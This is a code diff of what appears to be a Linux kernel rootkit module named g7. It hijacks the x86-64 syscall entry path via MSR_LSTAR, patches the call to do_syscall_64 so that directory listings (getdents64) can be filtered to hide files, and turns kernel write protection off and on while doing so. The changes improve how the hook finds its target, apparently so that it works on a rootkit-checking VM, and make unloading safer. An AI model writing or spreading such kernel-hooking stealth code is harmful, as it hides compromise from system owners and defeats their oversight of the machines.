@@ -50,8 +50,10 @@ hide_files_lstar(void)
     atomic_set(&syscall64_count, 0);
     syscall_64_ptr = find_do_syscall_64((char *)read_msr(MSR_LSTAR));
 
-    if(!do_syscall_64 || !syscall_64_ptr)
+    if(!do_syscall_64 || !syscall_64_ptr) {
+        DEBUG_INFO("Couldn't find do_syscall64!\n");
         return;
+    }
 
     //Calculate new call offset to our function
     //newOff = g7_syscall_64_addr - nextOpcodeAddr
@@ -71,8 +73,8 @@ unhide_files_lstar(void)
     disable_protection();
     memcpy((syscall_64_ptr + 1), &oldOff, 4);
     enable_protection();
-    if (atomic_read(&syscall64_count) > 0)
-        msleep(10000);
+    while (atomic_read(&syscall64_count) > 0)
+        msleep(250);
 }
 
 //Only use with multiples of 16..
@@ -115,12 +117,20 @@ static char *
 find_do_syscall_64(char *lstar_addr)
 {
     //Step 1: get address of stage 2 trampoline
-    char *stage2_ptr = strnstr(lstar_addr, movSignExtended, SEARCHLEN);
+    //If lstar_addr points to entry_SYSCALL_64 directly, skip this part (the case on rkcheck VM)
+    unsigned long stage2_addr;
 
-    if(!stage2_ptr)
-        return NULL;
+    //Not good, more of a hotfix: check if swapgs is first instruction; if so, we are at entry_SYSCALL_64
+    if(!memcmp(lstar_addr, "\x0f\x01\xf8", 3)) {
+        stage2_addr = (unsigned long)lstar_addr;
+    } else {
+        char *stage2_ptr = strnstr(lstar_addr, movSignExtended, SEARCHLEN);
 
-    unsigned long stage2_addr = mem_offset(stage2_ptr + 3); //3 bytes offset to skip opcode
+        if(!stage2_ptr)
+            return NULL;
+
+        stage2_addr = mem_offset(stage2_ptr + 3); //3 bytes offset to skip opcode
+    }
 
     //Step 2: conveniently, no 'pointer' chasing is necessary, we can just look for the jump opcode from here
     char *syscall64_call_ptr = strnstr((char *)stage2_addr, callNearRelative, SEARCHLEN);
@@ -140,6 +150,11 @@ find_do_syscall_64(char *lstar_addr)
     return syscall64_call_ptr;
 }
 
+//To avoid issues when unloading, check first for getdents64
+//Defer other syscalls to avoid increasing our atomic count
+//We use a jump to avoid building a new stack frame with call
+//GCC generates a call instruction at the beginning here that we overwrite with NOPs..
+//see also objdump -d -M intel g7.ko | grep -A 3 check_getdents64
 void
 check_getdents64(void)
 {
